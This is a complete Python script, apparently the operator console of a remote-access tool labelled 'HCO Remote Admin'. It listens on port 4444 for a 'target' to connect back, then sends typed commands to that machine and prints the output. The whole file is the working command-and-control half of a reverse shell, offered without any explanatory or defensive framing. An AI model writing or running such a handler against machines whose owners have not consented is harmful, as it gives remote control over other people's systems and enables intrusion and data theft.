import socket

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    host = '0.0.0.0'
    port = 4444
    
    server.bind((host, port))
    server.listen(1)
    print(f"[*] HCO Remote Admin - Server Started on port {port}...")
    print("[*] Waiting for target connection...")
    
    client_socket, client_address = server.accept()
    print(f"[+] Connection established successfully from {client_address[0]}:{client_address[1]}")
    
    while True:
        try:
            command = input("HCO-Admin> ")
            if command.lower() == 'exit':
                client_socket.send(b'exit')
                break
            if len(command.strip()) == 0:
                continue
                
            client_socket.send(command.encode('utf-8'))
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(response)
        except Exception as e:
            print(f"[-] Error: {e}")
            break
        
    client_socket.close()
    server.close()

if __name__ == "__main__":
    start_server()
